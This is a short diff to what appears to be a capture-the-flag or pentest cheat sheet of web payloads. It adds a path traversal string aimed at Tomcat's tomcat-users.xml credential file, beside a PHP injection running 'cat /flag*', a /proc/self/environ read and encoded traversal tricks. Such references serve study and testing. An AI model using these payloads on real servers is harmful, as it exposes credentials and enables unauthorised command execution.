@@ -14,6 +14,7 @@
   - `?file='.system("cat /flag*").'`
   - `/../../../../../../proc/self/environ`
   - `/_nuxt/@fs/flag.txt`
+  - `../../../../../../conf/tomcat-users.xml`
   
 ### Path traversal
   - `%2e%2e/` -> `../`
